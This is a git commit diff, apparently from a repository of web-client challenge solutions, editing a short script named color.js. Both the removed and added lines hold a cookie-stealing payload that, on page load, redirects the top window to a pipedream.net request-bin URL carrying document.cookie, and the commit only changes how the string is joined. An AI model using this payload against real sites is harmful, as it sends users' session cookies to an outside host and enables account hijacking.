8a87abe2cf95fce634adf1e72fcbb385932c493e
Ruzbehi <45848110+Ruzbehi@users.noreply.github.com>
2024-04-30 17:49:28 +0200

    chore(root): change syntax

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,3 +1,3 @@
 window.onload = (event) => {
-  window.top.location = "https://enn4e6nyrcddb.x.pipedream.net/?hello-there".concat(encodeURI(document.cookie));
+  window.top.location = "https://enn4e6nyrcddb.x.pipedream.net/?hello-there=" + document.cookie;
 };
